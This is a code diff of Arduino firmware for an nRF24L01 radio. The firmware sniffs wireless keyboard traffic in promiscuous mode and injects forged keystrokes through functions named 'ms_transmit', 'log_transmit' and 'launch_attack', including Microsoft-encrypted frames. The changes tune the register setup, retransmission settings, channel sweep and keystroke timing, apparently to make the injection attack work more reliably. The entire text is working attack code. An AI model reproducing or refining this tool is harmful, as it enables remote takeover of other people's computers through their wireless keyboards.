@@ -99,23 +99,24 @@ void scan() {
 
   // the order of the following is VERY IMPORTANT
   radio.setAutoAck(false);
-  radio.setPALevel(RF24_PA_MAX);
-  radio.setDataRate(RF24_2MBPS);
+  // radio.setPALevel(RF24_PA_MIN);
+  // radio.setDataRate(RF24_2MBPS);
+  writeRegister(RF_SETUP, 0x09); // Disable PA, 2M rate, LNA enabled
   radio.setPayloadSize(32);
   radio.setChannel(channel);
   // RF24 doesn't ever fully set this -- only certain bits of it
-  writeRegister(0x02, 0x00);
+  writeRegister(EN_RXADDR, 0x00);
   // RF24 doesn't have a native way to change MAC...
   // 0x00 is "invalid" according to the datasheet, but Travis Goodspeed found it works :)
-  writeRegister(0x03, 0x00);
+  writeRegister(SETUP_AW, 0x00);
   radio.openReadingPipe(0, promisc_addr);
   radio.disableCRC();
   radio.startListening();
-  radio.printDetails();
+  //radio.printDetails();
 
   while (1) {
     channel++;
-    if (channel > 80) {
+    if (channel > 84) {
       Serial.println("starting channel sweep");
       digitalWrite(ledpin, HIGH);
       channel = 2;
@@ -125,11 +126,11 @@ void scan() {
       digitalWrite(ledpin, LOW);
     }
 
-    if (channel == 40) {
+    if (channel == 42) {
       digitalWrite(ledpin, HIGH);
     }
 
-    if (channel == 42) {
+    if (channel == 44) {
       digitalWrite(ledpin, LOW);
     }
 
@@ -215,14 +216,18 @@ void scan() {
 void start_transmit()
 {
   radio.stopListening();
+
   radio.openWritingPipe(address);
+  radio.openReadingPipe(1, address);
   radio.setAutoAck(true);
   radio.setPALevel(RF24_PA_MAX);
   radio.setDataRate(RF24_2MBPS);
   radio.setPayloadSize(32);
   radio.enableDynamicPayloads();
+  writeRegister(SETUP_AW, 0x03); // Reset addr size to 5 bytes
+  radio.setRetries(5,15); // retransmission: interval and count
   radio.setChannel(channel);
-  writeRegister(0x03, 0x03);
+
   return;
 }
 
@@ -283,6 +288,7 @@ void ms_transmit(uint8_t meta, uint8_t hid) {
   if (payload_encrypted) ms_crypt();
   // send keystroke (key down)
   transmit();
+  delay(5);
   sequence++;
 
   if (payload_encrypted) ms_crypt();
@@ -295,10 +301,9 @@ void ms_transmit(uint8_t meta, uint8_t hid) {
   if (payload_encrypted) ms_crypt();
   // send null keystroke (key up)
   transmit();
+  delay(5);
   sequence++;
 
-  // inter-keystroke delay
-  delay(5);
   return;
 }
 
@@ -325,6 +330,7 @@ void log_transmit(uint8_t meta, uint8_t hid) {
 
   // send key down
   transmit();
+  delay(5);
 
   // prepare key up (null) frame
   payload[2] = 0;
@@ -333,9 +339,8 @@ void log_transmit(uint8_t meta, uint8_t hid) {
 
   // send key up
   transmit();
+  delay(5);
 
-  // inter-keystroke delay
-  delay(10);
   return;
 }
 
@@ -344,7 +349,7 @@ void launch_attack() {
 
   if (payload_type) {
     Serial.println("payload type is injectable");
-    
+
     digitalWrite(ledpin, HIGH);
     start_transmit();
 
